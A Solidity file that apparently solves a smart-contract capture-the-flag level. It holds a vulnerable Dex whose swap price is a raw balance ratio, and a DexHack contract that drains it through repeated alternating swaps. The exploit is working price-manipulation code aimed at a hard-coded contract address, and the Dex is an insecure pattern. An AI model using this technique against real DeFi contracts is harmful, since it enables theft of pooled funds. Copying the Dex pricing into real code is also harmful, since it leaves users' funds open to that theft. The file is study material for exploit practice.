// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./openzeppelin/contracts/token/ERC20/IERC20.sol";
import "./openzeppelin/contracts/token/ERC20/ERC20.sol";
import './openzeppelin/contracts/math/SafeMath.sol';
import './openzeppelin/contracts/access/Ownable.sol';

contract Dex is Ownable {
  using SafeMath for uint;
  address public token1;
  address public token2;
  constructor() public {}

  function setTokens(address _token1, address _token2) public onlyOwner {
    token1 = _token1;
    token2 = _token2;
  }
  
  function addLiquidity(address token_address, uint amount) public onlyOwner {
    IERC20(token_address).transferFrom(msg.sender, address(this), amount);
  }
  
  function swap(address from, address to, uint amount) public {
    require((from == token1 && to == token2) || (from == token2 && to == token1), "Invalid tokens");
    require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
    uint swapAmount = getSwapPrice(from, to, amount);
    IERC20(from).transferFrom(msg.sender, address(this), amount);
    IERC20(to).approve(address(this), swapAmount);
    IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
  }

  function getSwapPrice(address from, address to, uint amount) public view returns(uint){
    return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));
  }

  function approve(address spender, uint amount) public {
    SwappableToken(token1).approve(msg.sender, spender, amount);
    SwappableToken(token2).approve(msg.sender, spender, amount);
  }

  function balanceOf(address token, address account) public view returns (uint){
    return IERC20(token).balanceOf(account);
  }
}

contract SwappableToken is ERC20 {
  address private _dex;
  constructor(address dexInstance, string memory name, string memory symbol, uint256 initialSupply) public ERC20(name, symbol) {
        _mint(msg.sender, initialSupply);
        _dex = dexInstance;
  }

  function approve(address owner, address spender, uint256 amount) public returns(bool){
    require(owner != _dex, "InvalidApprover");
    super._approve(owner, spender, amount);
  }
}

contract DexHack {
    Dex public dex = Dex(0x7c56290f99aFE6312DBB54cE1491E25840832cCa);
    SwappableToken public token1 = SwappableToken(dex.token1());
    SwappableToken public token2 = SwappableToken(dex.token2());

    constructor() public {
        token1.approve(msg.sender, address(this), uint256(0) - 1);
        token2.approve(msg.sender, address(this), uint256(0) - 1);

        token1.transferFrom(msg.sender, address(this), token1.balanceOf(msg.sender));
        token2.transferFrom(msg.sender, address(this), token2.balanceOf(msg.sender));

        dex.approve(address(dex), uint256(0) - 1);

        dex.swap(address(token1), address(token2), 10); 
        dex.swap(address(token2), address(token1), 20); 
        dex.swap(address(token1), address(token2), 24); 
        dex.swap(address(token2), address(token1), 30); 
        dex.swap(address(token1), address(token2), 41);
        dex.swap(address(token2), address(token1), 45); 
    }
}